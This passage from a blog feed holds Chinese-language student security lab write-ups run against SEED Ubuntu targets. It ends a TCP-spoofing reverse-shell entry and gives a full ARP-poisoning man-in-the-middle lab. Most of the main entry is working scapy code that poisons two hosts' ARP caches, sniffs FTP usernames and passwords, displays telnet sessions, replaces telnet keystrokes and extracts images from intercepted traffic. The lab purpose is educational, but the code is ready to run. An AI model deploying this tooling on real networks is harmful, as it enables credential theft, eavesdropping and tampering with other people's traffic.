-lvp "</span> + localPort)  <span class="comment">#开启监听端口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
<p>首先客户机靶机B向靶机A发起telnet连接，成功建立连接后运行python程序，输入相关数据后靶机B往telnet键入任意字符。</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200401165154685.png" alt="image-20200401165154685"></p>
<p>靶机B键入任意字符后立即“停止响应”,kali攻击机反弹回靶机A的shell</p>
<p>靶机A的抓包情况</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200401165611070.png" alt="image-20200401165611070"></p>
<p>当反弹shell生成后，靶机B的telnet的连接便失去了正常通信</p>
<p>但是当靶机B关掉当前未响应的终端，kali攻击机的反弹shell便马上断开连接</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200401165239243.png" alt="image-20200401165239243"></p>
<h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><p>本次实验复现了伪造TCP报文的各种攻击，其中反弹shell的脚本存在缺陷：一是无法在后台运行(使用nohup &amp;依然不行)，当靶机B断开连接后shell马上断开；二是shell连接未能实现匿名IP连接；三是只有靶机A、B已经建立连接后才可以获得反向shell，先启动python脚本再建立连接并不能成功建立连接。</p>
]]></content>
      <categories>
        <category>信息安全学习</category>
      </categories>
      <tags>
        <tag>scapy</tag>
      </tags>
  </entry>
  <entry>
    <title>MITM攻击之ARP毒化</title>
    <url>/posts/4026efe8/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><blockquote>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325211150567.png" alt="image-20200325211150567" style="zoom: 50%;"><a id="more"></a></p>
</blockquote>
<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><p>运行python代码，演示MITM攻击现象</p>
<h2 id="python代码"><a href="#python代码" class="headerlink" title="python代码"></a>python代码</h2><p>代码由两部分组成，一个是ArpPoison.py模块文件，便于调用和自定义攻击对象。另一个一个是newMitM.py对象文件。</p>
<h3 id="ArpPoison-py"><a href="#ArpPoison-py" class="headerlink" title="ArpPoison.py"></a>ArpPoison.py</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">__author__ = <span class="string">'Asymptotic_freedom'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArpPoison</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    这是一个实现ARP毒化的类</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, interface, victimIP1, victimIP2, interval=<span class="number">1.5</span>)</span>:</span></span><br><span class="line">        self.__interface = interface  <span class="comment"># 网络接口</span></span><br><span class="line">        self.__victimIP1 = victimIP1  <span class="comment">#靶机IP1</span></span><br><span class="line">        self.__victimIP2 = victimIP2  <span class="comment">#靶机IP2</span></span><br><span class="line">        self.__interval = interval  <span class="comment">#ARP包发送间隔</span></span><br><span class="line">        self.__victimMAC1 = <span class="string">"ff:ff:ff:ff:ff:ff"</span></span><br><span class="line">        self.__victimMAC2 = <span class="string">"ff:ff:ff:ff:ff:ff"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getMAC</span><span class="params">(interface, IP)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        srp(发送+接收2层报文),返回结果是两个元组。</span></span><br><span class="line"><span class="string">        ARP.op  取值为1或者2，代表ARP请求或者响应包,默认为1。</span></span><br><span class="line"><span class="string">        向外广播ARP请求IP地址对应的MAC，超时等待为2s，</span></span><br><span class="line"><span class="string">        接口为self.__interface,时间间隔为0.1s。</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        conf.verb = <span class="number">0</span>  <span class="comment">#关闭输出</span></span><br><span class="line">        ans, unans = srp(Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>) / ARP(pdst=IP),</span><br><span class="line">                         timeout=<span class="number">2</span>,</span><br><span class="line">                         iface=interface,</span><br><span class="line">                         inter=<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">for</span> snd, rcv <span class="keyword">in</span> ans:</span><br><span class="line">            <span class="keyword">return</span> rcv.sprintf(<span class="string">r"%Ether.src%"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__spoof</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        进行ARP欺骗，对两个靶机分别发送伪造arp报文</span></span><br><span class="line"><span class="string">        MAC地址重定向为该主机</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        send(</span><br><span class="line">            ARP(op=<span class="number">2</span>,</span><br><span class="line">                pdst=self.__victimIP1,</span><br><span class="line">                psrc=self.__victimIP2,</span><br><span class="line">                hwdst=self.__victimMAC1))</span><br><span class="line">        send(</span><br><span class="line">            ARP(op=<span class="number">2</span>,</span><br><span class="line">                pdst=self.__victimIP2,</span><br><span class="line">                psrc=self.__victimIP1,</span><br><span class="line">                hwdst=self.__victimMAC2))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__resARP</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        为了避免停止arp毒化后暴露本机MAC地址</span></span><br><span class="line"><span class="string">        恢复两个靶机的ARP表</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        print(<span class="string">"\n[*] 恢复对象机网络状态..."</span>)</span><br><span class="line">        self.__victimMAC1 = self.getMAC(self.__interface, self.__victimIP1)</span><br><span class="line">        self.__victimMAC2 = self.getMAC(self.__interface, self.__victimIP2)</span><br><span class="line">        send(ARP(op=<span class="number">2</span>,</span><br><span class="line">                 pdst=self.__victimIP2,</span><br><span class="line">                 psrc=self.__victimIP1,</span><br><span class="line">                 hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>,</span><br><span class="line">                 hwsrc=self.__victimMAC1),</span><br><span class="line">             count=<span class="number">8</span>)</span><br><span class="line">        send(ARP(op=<span class="number">2</span>,</span><br><span class="line">                 pdst=self.__victimIP1,</span><br><span class="line">                 psrc=self.__victimIP2,</span><br><span class="line">                 hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>,</span><br><span class="line">                 hwsrc=self.__victimMAC2),</span><br><span class="line">             count=<span class="number">8</span>)</span><br><span class="line">        print(<span class="string">"[*] 禁用该主机进行IP转发..."</span>)</span><br><span class="line">        os.system(<span class="string">"sudo echo 0 &gt; /proc/sys/net/ipv4/ip_forward"</span>)</span><br><span class="line">        print(<span class="string">"\n[*] Exiting..."</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''启动arp毒化进程'''</span></span><br><span class="line">        print(<span class="string">"\n[*] 允许该主机进行IP包转发..."</span>)</span><br><span class="line">        <span class="comment">#sudo sysctl net.ipv4.ip_forward=1</span></span><br><span class="line">        os.system(<span class="string">"sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.__victimMAC1 = self.getMAC(self.__interface, self.__victimIP1)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            os.system(<span class="string">"sudo echo 0 &gt; /proc/sys/net/ipv4/ip_forward"</span>)</span><br><span class="line">            print(<span class="string">"\n[!] 找不到%s的地址"</span>%(self.__victimIP1))</span><br><span class="line">            print(<span class="string">"[!] Exiting..."</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.__victimMAC2 = self.getMAC(self.__interface, self.__victimIP2)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="comment">#sudo sysctl net.ipv4.ip_forward=0</span></span><br><span class="line">            os.system(<span class="string">"sudo echo 0 &gt; /proc/sys/net/ipv4/ip_forward"</span>)</span><br><span class="line">            print(<span class="string">"\n[!] 找不到%s的地址"</span>%(self.__victimIP2))</span><br><span class="line">            print(<span class="string">"[!] Exiting..."</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.__spoof()</span><br><span class="line">                time.sleep(self.__interval)</span><br><span class="line">            <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                self.__resARP()</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
<h3 id="newMitM-py"><a href="#newMitM-py" class="headerlink" title="newMitM.py"></a>newMitM.py</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> arpPoison <span class="keyword">import</span> ArpPoison</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> netifaces</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Asymptotic_freedom'</span></span><br><span class="line"></span><br><span class="line">clientIP = <span class="literal">None</span></span><br><span class="line">serverIP = <span class="literal">None</span></span><br><span class="line">isCnted = <span class="literal">False</span></span><br><span class="line">clientMAC = <span class="literal">None</span></span><br><span class="line">serverMAC = <span class="literal">None</span></span><br><span class="line">localMAC = <span class="literal">None</span></span><br><span class="line">re_jpg = <span class="string">b'\xff\xd8\xff[\s\S]*\xff\xd9'</span></span><br><span class="line">re_png = <span class="string">b'\x89\x50\x4e\x47[\s\S]*\xae\x42\x60\x82'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sniff(filter=<span class="string">'tcp port 21'</span>, prn=ftpSniff)</span><br><span class="line">        <span class="comment">#sniff(filter='tcp port 23',prn=telnetSniff)</span></span><br><span class="line">        <span class="comment">#os.system("sudo sysctl net.ipv4.ip_forward=0")</span></span><br><span class="line">        <span class="comment">#sniff(filter='tcp port 23',prn=telnetReplace)</span></span><br><span class="line">        <span class="comment">#sniff(filter='tcp', prn=imageSniff)</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ftpSniff</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="string">'''嗅探FTP用户密码'''</span></span><br><span class="line">    dest = pkt[IP].dst</span><br><span class="line">    raw = str(pkt[TCP].payload)</span><br><span class="line">    user = re.findall(<span class="string">'(?i)USER (.*)'</span>, raw)</span><br><span class="line">    pswd = re.findall(<span class="string">'(?i)PASS (.*)'</span>, raw)</span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        print(<span class="string">'[*] Detected FTP Login to '</span> + str(dest))</span><br><span class="line">        print(<span class="string">'[+] User account: '</span> + str(user[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">elif</span> pswd:</span><br><span class="line">        print(<span class="string">'[+] Password: '</span> + str(pswd[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">telnetSniff</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="string">'''嗅探telnet密码(主要是显示对话信息)'''</span></span><br><span class="line">    <span class="keyword">global</span> isCnted</span><br><span class="line">    src = pkt[IP].src</span><br><span class="line">    raw = str(pkt[TCP].payload)</span><br><span class="line">    <span class="comment">#raw=re.sub(u"([^\u4e00-\u9fa5\u0030-\u0039\u0041-\u005a\u0061-\u007a])","",raw)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(raw):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> src == clientIP:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(raw) + <span class="number">1</span>):</span><br><span class="line">            print(raw[i - <span class="number">1</span>], end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">48</span> == <span class="number">0</span>:</span><br><span class="line">                print()</span><br><span class="line">        print()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Welcome'</span> <span class="keyword">in</span> raw:</span><br><span class="line">            isCnted = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> isCnted:</span><br><span class="line">            print(<span class="number">38</span> * <span class="string">'-'</span> + <span class="string">"Establish connection"</span> + <span class="number">38</span> * <span class="string">'-'</span>)</span><br><span class="line">            isCnted = <span class="literal">False</span></span><br><span class="line">        print(<span class="number">48</span> * <span class="string">' '</span>, end=<span class="string">''</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(raw) + <span class="number">1</span>):</span><br><span class="line">            print(raw[i - <span class="number">1</span>], end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">48</span> == <span class="number">0</span>:</span><br><span class="line">                print()</span><br><span class="line">                print(<span class="number">48</span> * <span class="string">' '</span>, end=<span class="string">''</span>)</span><br><span class="line">        print()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'logout'</span> <span class="keyword">in</span> raw:</span><br><span class="line">            print(<span class="number">37</span> * <span class="string">'-'</span> + <span class="string">"Connection interrupted"</span> + <span class="number">37</span> * <span class="string">'-'</span>)</span><br><span class="line">            isCnted = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">telnetReplace</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="string">'''telnet替换内容为字母Z'''</span></span><br><span class="line">    <span class="keyword">global</span> clientIP, serverIP, isCnted, interface, clientMAC, serverMAC, localMAC</span><br><span class="line">    esrc = pkt[Ether].src</span><br><span class="line">    ipsrc = pkt[IP].src</span><br><span class="line">    ipdst = pkt[IP].dst</span><br><span class="line">    raw = str(pkt[TCP].payload)</span><br><span class="line">    <span class="keyword">if</span> esrc == clientMAC <span class="keyword">and</span> ipsrc == clientIP <span class="keyword">and</span> ipdst == serverIP:</span><br><span class="line">        print(<span class="string">"Original Packet. "</span>)</span><br><span class="line">        print(<span class="string">"Source IP : "</span>, pkt[IP].src)</span><br><span class="line">        print(<span class="string">"Destination IP :"</span>, pkt[IP].dst)</span><br><span class="line"></span><br><span class="line">        a = IP(src=clientIP, dst=serverIP)</span><br><span class="line">        b = TCP(sport=pkt[IP].sport, dport=pkt[IP].dport)</span><br><span class="line">        pkt[TCP].payload = <span class="string">'Z'</span></span><br><span class="line">        data = <span class="string">'Z'</span></span><br><span class="line">        newpkt = a / b / data</span><br><span class="line">        <span class="keyword">del</span> newpkt[IP].chksum</span><br><span class="line">        <span class="keyword">del</span> newpkt[TCP].chksum</span><br><span class="line">        <span class="keyword">del</span> newpkt[IP].len</span><br><span class="line">        print(newpkt)</span><br><span class="line">        print(<span class="string">"Spoofed Packet.  "</span>)</span><br><span class="line">        print(<span class="string">"Source IP : "</span>, newpkt[IP].src)</span><br><span class="line">        print(<span class="string">"Destination IP :"</span>, newpkt[IP].dst)</span><br><span class="line">        send(newpkt)</span><br><span class="line">    <span class="keyword">elif</span> esrc == serverMAC <span class="keyword">and</span> ipsrc == serverIP <span class="keyword">and</span> ipdst == clientIP:</span><br><span class="line">        a = IP(src=serverIP, dst=clientIP)</span><br><span class="line">        b = TCP(sport=pkt[IP].sport, dport=pkt[IP].dport)</span><br><span class="line">        data = pkt[TCP].payload</span><br><span class="line">        newpkt = a / b / data</span><br><span class="line">        send(newpkt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">imageSniff</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="string">'''嗅探图片并保存在本地'''</span></span><br><span class="line">    <span class="keyword">global</span> clientIP</span><br><span class="line">    ipsrc = pkt[IP].src</span><br><span class="line">    ipdst = pkt[IP].dst</span><br><span class="line">    <span class="keyword">if</span> ipsrc != clientIP <span class="keyword">and</span> ipdst != clientIP:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    data = str.encode(str(pkt[TCP].payload))</span><br><span class="line">    jpgs = re.findall(re_jpg, data)</span><br><span class="line">    pngs = re.findall(re_png, data)</span><br><span class="line">    <span class="keyword">for</span> jpg <span class="keyword">in</span> jpgs:</span><br><span class="line">        now = time.time()</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'jpg/'</span> + str(now) + <span class="string">'.jpg'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(jpg)</span><br><span class="line">            print(str(now) + <span class="string">'.jpg'</span>)</span><br><span class="line">    <span class="keyword">for</span> png <span class="keyword">in</span> pngs:</span><br><span class="line">        now = time.time()</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'png/'</span> + str(now) + <span class="string">'.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(jpg)</span><br><span class="line">            print(str(now) + <span class="string">'.png'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> clientIP, serverIP, interface, clientMAC, serverMAC, localMAC</span><br><span class="line">    print(<span class="string">"这是系统可用设备的列表:\n"</span>)</span><br><span class="line">    sn = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> interface <span class="keyword">in</span> netifaces.interfaces():</span><br><span class="line">        print(<span class="string">"%d.%-10s \033[92m%-10s \033[0m"</span> %</span><br><span class="line">              (sn, interface, netifaces.ifaddresses(interface)[<span class="number">2</span>][<span class="number">0</span>][<span class="string">'addr'</span>]))</span><br><span class="line">        sn += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> netifaces.interfaces():</span><br><span class="line">        print(<span class="string">"检测不到网卡设备"</span>)</span><br><span class="line">        print(<span class="string">"[*] Exiting..."</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        interface = input(<span class="string">"\n[*] 请输入要在该主机上运行ARP毒化的接口名称: "</span>)</span><br><span class="line">        <span class="keyword">if</span> interface <span class="keyword">not</span> <span class="keyword">in</span> netifaces.interfaces():</span><br><span class="line">            print(<span class="string">"[!] 找不到该接口，请检查接口名称"</span>)</span><br><span class="line">            print(<span class="string">"[*] Exiting..."</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        serverIP = input(<span class="string">"[*] 请输入serverIP: "</span>)</span><br><span class="line">        clientIP = input(<span class="string">"[*] 请输入clientIP: "</span>)</span><br><span class="line">        localMAC = netifaces.ifaddresses(interface)[<span class="number">17</span>][<span class="number">0</span>][<span class="string">'addr'</span>]</span><br><span class="line">        serverMAC = ArpPoison.getMAC(interface, serverIP)</span><br><span class="line">        clientMAC = ArpPoison.getMAC(interface, clientIP)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">"\n[*] 用户请求中断"</span>)</span><br><span class="line">        print(<span class="string">"[*] Exiting..."</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#创建一个线程运行exploit()函数</span></span><br><span class="line">    th = threading.Thread(target=exploit)</span><br><span class="line">    th.setDaemon(<span class="literal">True</span>)  <span class="comment">#把当前进程设置为守护线程，主线程执行完毕，子线程均停止</span></span><br><span class="line">    th.start()</span><br><span class="line">    <span class="comment">#主线程运行</span></span><br><span class="line">    mitm = ArpPoison(interface, serverIP, clientIP)</span><br><span class="line">    mitm.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
<h2 id="实验配置"><a href="#实验配置" class="headerlink" title="实验配置"></a>实验配置</h2><ul>
<li><p>攻击机为Linux kali 5.3.0，IP为192.168.2.207</p>
<p>初始ARP缓存表</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325222344205.png" alt="image-20200325222344205" style="zoom: 150%;"></p>
</li>
</ul>
<ul>
<li><p>受害机A(客户机)为SEEDUbuntu16，IP为192.168.2.101</p>
<p>初始ARP缓存表</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325222441149.png" alt="image-20200325222441149"></p>
</li>
</ul>
<ul>
<li><p>网关机B(服务机)为SEEDUbuntu16，IP为192.168.2.244</p>
<p>初始ARP缓存表</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325222554498.png" alt="image-20200325222554498"></p>
</li>
<li><p>python 3.7.6</p>
</li>
</ul>
<h2 id="检查ARP表变化"><a href="#检查ARP表变化" class="headerlink" title="检查ARP表变化"></a>检查ARP表变化</h2><p>运行newMitM.py</p>
<p>作用机理是kali攻击机不断（间隔为1.5s）向外广播Arp响应数据报（op=2，其中dstMAC=“ff:ff:ff:ff:ff:ff”，达到短时间就毒化ARP的效果</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python3  newMitM.py</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325223118966.png" alt="image-20200325223118966"></p>
<p>主机A(192.168.2.101)ARP表如下</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325223316269.png" alt="image-20200325223316269"></p>
<p>主机B(192.168.2.244)ARP变化如下</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325223452300.png" alt="image-20200325223452300"></p>
<p>可见A、B的对向MAC地址均指向kali攻击机</p>
<p>wireshark查看kali数据包</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325224407601.png" alt></p>
<p>主机A数据包</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325224413307.png" alt="image-20200325224413307"></p>
<p>主机B数据包</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325224526302.png" alt="image-20200325224526302"></p>
<h2 id="嗅探数据包"><a href="#嗅探数据包" class="headerlink" title="嗅探数据包"></a>嗅探数据包</h2><p>打开IP转发功能</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">os.system(<span class="string">"sudo sysctl net.ipv4.ip_forward=1"</span>)</span><br></pre></td></tr></table></figure></div>
<p>A Ping B：</p>
<p>在kali wireshark捕获ICMP数据包</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325225320127.png" alt="image-20200325225320127"></p>
<p>并且为其转发</p>
<p>A:</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325225507952.png" alt="image-20200325225507952"></p>
<p>B：</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325225442543.png" alt="image-20200325225442543"></p>
<h2 id="MITM攻击"><a href="#MITM攻击" class="headerlink" title="MITM攻击"></a>MITM攻击</h2><h3 id="嗅探FTP报文密码"><a href="#嗅探FTP报文密码" class="headerlink" title="嗅探FTP报文密码"></a>嗅探FTP报文密码</h3><p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325225646459.png" alt="image-20200325225646459"></p>
<p>将ftpSniff所在行注释去掉</p>
<p>A登陆B的ftp</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ftp 192.168.2.244</span><br><span class="line">seed</span><br><span class="line">dess</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325225907965.png" alt="image-20200325225907965"></p>
<p>python程序捕捉到账号密码</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325225954356.png" alt="image-20200325225954356"></p>
<p>报文查看TCP流</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325230323170.png" alt="image-20200325230323170"></p>
<p>账号和USER在同一个报文里，密码和PASS在同一个报文里，很容易被嗅探到</p>
<h3 id="嗅探telnet密码"><a href="#嗅探telnet密码" class="headerlink" title="嗅探telnet密码"></a>嗅探telnet密码</h3><p>去掉exploit()函数关于telnetSniff的注释</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200401101056472.png" alt="image-20200401101056472"></p>
<p>主机A向B进行telenet登陆：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.2.244</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325231226279.png" alt="image-20200325231226279"></p>
<p>嗅探到的数据流在屏幕上显示</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325231455436.png" alt="image-20200325231455436"></p>
<p>左边一列是主机A，右边一列是主机B</p>
<p>可以看见输入字符边输入边回显，密码则没有回显，这与FTP大不相同</p>
<p>查看wireshark数据流</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325231805934.png" alt="image-20200325231805934"></p>
<p>红色代表主机A向B发送的数据内容，蓝色则是B，各数据段分散开来。</p>
<h3 id="telnet替换内容为字母Z"><a href="#telnet替换内容为字母Z" class="headerlink" title="telnet替换内容为字母Z"></a>telnet替换内容为字母Z</h3><p>从上面我们可以看到telnet输入一个字符就回显该字符，尝试替换该字符</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325232353403.png" alt="image-20200325232353403"></p>
<p>将exploit的这两行注释去掉</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200401101129803.png" alt="image-20200401101129803"></p>
<p>首先进行A向B的telnet连接</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325232530123.png" alt="image-20200325232530123"></p>
<p>然后运行python程序</p>
<p>其中下面的代码让kali攻击机停止转发功能</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">os.system(&quot;sudo sysctl net.ipv4.ip_forward&#x3D;0&quot;)</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325232813792.png" alt="image-20200325232813792"></p>
<p>尝试在A中输入字符，发现无法回显</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325233152784.png" alt="image-20200325233152784"></p>
<p>主机B收到了内容被替换为Z的数据包</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325233413549.png" alt="image-20200325233413549"></p>
<p>主机A没有收到回应</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325233605455.png" alt="image-20200325233605455"></p>
<p>关掉程序</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325233728976.png" alt="image-20200325233728976"></p>
<p>A的终端界面依然无法显示任何字符，</p>
<p>过两三分钟后，由于A获取不到信息，重新发送了ARP报文，当获取B的正确的MAC地址，就可以正常显示字符了</p>
<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325234234260.png" alt="image-20200325234234260"></p>
<h1 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h1><p>本次实验通过进一步学习scapy编程掌握了制包、抓包、改包，实现了ARP毒化的MITM攻击。然而有点奇怪的是，在telnet替换内容为字母Z实验中，理应得到主机B回显的内容却未能得到响应，这着实令人费解。。。</p>
]]></content>
      <categories>
        <category>信息安全学习</category>
      </categories>
      <tags>
        <tag>scapy</tag>
      </tags>
  </entry>
  <entry>
